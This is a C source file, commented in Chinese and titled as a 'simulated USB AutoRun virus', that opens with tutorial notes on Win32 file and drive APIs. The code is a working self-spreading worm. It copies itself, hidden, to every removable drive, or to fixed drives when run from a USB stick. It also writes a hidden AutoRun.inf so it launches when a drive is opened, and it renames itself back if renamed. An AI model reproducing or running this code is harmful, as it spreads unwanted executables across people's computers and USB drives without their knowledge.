/** Name: 模拟U盘AutoRun病毒*/
/*
	文件的打开和关闭：

		文件打开函数：HANDLE CreateFile(
			LPCSTR lpFileName,//想要打开或者创建的文件名或者被视为文件的设备对象
			DWORD dwDesiredAccess,//文件的访问模式，通常是GENERIC_READ和GENERIC_WRITE只读只写模式，也可以使用位或实现读写同时
			DWORD dwShareMode,//打开文件的共享模式，标识是否进程共享，如果可以，则进行指定
			LPSECURITY_ATTRIBUTES lpSecurityAttributes,//标识安全属性，参数可以指定返回的文件句柄是否能够被继承，设置为NULL则无法被继承，否则填入结构体
			DWORD dwCreationDisposition,//在创建或者打开的文件不存在时的处理方式
			DWORD dwFlagsAndAttributes,//指定新建文件的属性和对文件操作的方式
			HANDLE hTemplateFile);//文件模板句柄，系统将复制改文件的所有属性到新建文件上
		返回值：执行失败返回INVALID_HANDLE_VALUE，可通过GetLastError()获取失败原因，正常则返回文件句柄

		文件关闭函数：BOOL CloseHandle(HANDLE handle);
		参数：要关闭的文件句柄，也可以是事件句柄，进程句柄，线程句柄等一系列句柄

	文件的操作：
		也就是文件的“增删改查”操作，不仅仅限制于文件内容本身，也包括文件的属性等。

		删除文件函数：BOOL DeleteFile(LPCTSTR lpFileName);
		如果文件被打开，基本就无法删除了

		读取文件内容函数：BOOL ReadFile(
			HANDLE hFile,//文件句柄
			LPVOID lpBuffer,//读取到的缓冲区
			DWORD nNumberofBytesToRead,//要求读入的字节数
			LPDWORD lpNumberofBytesToRead,//实际读入的字节数
			LPOVERLAPPED lpOverlapped);//一般为NULL

		写入文件内容函数：BOOL WriteFile(//参数同上
			HANDLE hFile,
			LPCVOID lpBuffer,
			DWORD nNumberofBytesToWrite,
			LPDWORD lpNumberofBytesWritten,
			LPVOERLAPPED lpOverLapped);
						
		强制刷写到磁盘函数：BOOL FlushFileBuffers(HANDLE hFile);

		文件读写指针移动函数：DWORD SetFilePointer(
			HANDLE hFile,//文件句柄
			LONG lDistanceToMove,//指定要移动的指针距离
			PLONG lpDistanceToMoveHigh,//指向LONG类型的指针，移动距离的高32位，一般为NULL
			DWORD dwMoveMethod);//指定移动的起始位置，FILE_BEGIN文件开头，FILE_CURRENT当前文件位置，FILE_END文件尾部

	驱动和目录操作：
		
		获取所有本地逻辑驱动器函数：DWORD GetLogicalDriveStrings(
			DWORD nBufferLength,//缓冲区最大长度
			LPTSTR lpBuffer);//缓冲区地址，保存格式为例如：C:\\\0D:\\\0 也就是C:\ D:\中间是\0分割，因此不适用与strlen计算，每4个字节是一个盘符
		返回值：实际的长度

		获取驱动器类型函数：UINT GetDriveType(LPCSTR lpRootPathName);
		参数：根路径，例如：C:\或D:\等
		返回值：
			DRIVE_UNKOWN:无法识别的驱动器类型
			DRIVE_NO_ROOT_DIR:无效的驱动器路径
			DRIVE_REMOVEBLE:可移动驱动器，比如：U盘、移动硬盘等
			DRIVE_FIXED:不可移动的磁盘，硬盘
			DRIVE_REMOTE:网络驱动器
			DRIVE_CDROM:光盘驱动器
			DRIVE_RAMDISK:虚拟驱动器

		创建目录的函数：BOOL CreateDirectory(LPCTSTR lpPathName,LPSECURITY_ATTRIBUTES lpSecurityAttributes);
		参数：创建的目录名称，安全属性（一般为NULL）

		移除目录的函数：BOOL RemoveDirectory(LPCTSTR lpPathName);
*/
#include<stdio.h>
#include<Windows.h>
//Autorun文件内容预准备
const char autorunContent[] = { "[AutoRun]\n\
open=%s\n\
shell\\open=打开(&O)\n\
shell\\open\\Command=%s\n\
shell\\explore=资源管理器(&X)\n\
shell\\explore\\Command=\"%s\"\n\
shellexecute=%s\n\
shell\\Auto\\Command=%s\n\
" };
//自动运行的程序名，也就是自身名称
const char runFileName[] = {"UDiskAutorunVirus.exe"};
//Autorun文件名
const char autoFileName[] = {"AutoRun.inf"};
void CopySelfAndBuildAutorun(char * selfPath,UINT driverType)
{
	//获取所有驱动器盘符,每个根路径之间是一个\0,返回值为总长度，因为\0的存在，例如：C:\ D:\ E:\ 
	char driverString[MAXBYTE] = { 0 };
	DWORD len = GetLogicalDriveStrings(MAXBYTE, driverString);
	//当前获取到的盘符下标，循环遍历所有盘符
	DWORD index = 0;
	while (index < len)
	{
		//获取当前扫描的盘符
		char root[4] = { 0 };
		strncpy(root, &driverString[index], 3);
		//判断盘符类型是否是传入类型
		UINT type = GetDriveType(root);
		if (type == driverType)
		{
			//复制自身到对应的盘符根目录
			char targetPath[MAX_PATH] = { 0 };
			sprintf(targetPath, "%s%s\0", root, runFileName);
			CopyFile(selfPath, targetPath, FALSE);
			//设置文件隐藏属性
			SetFileAttributes(targetPath, FILE_ATTRIBUTE_HIDDEN);
			//写入Autorun.inf文件
			char targetAuto[MAX_PATH] = {0};
			sprintf(targetAuto, "%s%s", root, autoFileName);
			HANDLE file = CreateFile(targetAuto, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			DWORD written = 0;
			char fileContent[2048] = { 0 };
			sprintf(fileContent, autorunContent, runFileName, runFileName, runFileName, runFileName, runFileName);
			WriteFile(file, fileContent, strlen(fileContent),&written,NULL);
			CloseHandle(file);
			//设置Autorun.inf隐藏属性
			SetFileAttributes(targetAuto, FILE_ATTRIBUTE_HIDDEN);
		}
		//遍历下一个盘符
		index += 4;
	}
}
int main(int argc, char * argv[])
{
	//防止自身名称被更改，运行一次就改回来一次
	rename(argv[0], runFileName);
	//获取本程序所在路径
	char selfPath[MAX_PATH] = { 0 };
	GetModuleFileName(NULL, selfPath, MAX_PATH);
	//获取路径的盘符
	char root[4] = { 0 };
	strncpy(root, selfPath, 3);
	//获取盘符的驱动器类型
	UINT type = GetDriveType(root);
	switch (type)
	{
	case DRIVE_FIXED://固态硬盘（本地磁盘）
		CopySelfAndBuildAutorun(selfPath, DRIVE_REMOVABLE);//在硬盘上就检查是否存在可移动磁盘，存在则复制自身并Autorun
		break;
	case DRIVE_REMOVABLE://可移动磁盘（U盘）
		CopySelfAndBuildAutorun(selfPath, DRIVE_FIXED);//如果在可移动磁盘上，就复制自身到硬盘上并Autorun
		break;
	}
	return 0;
}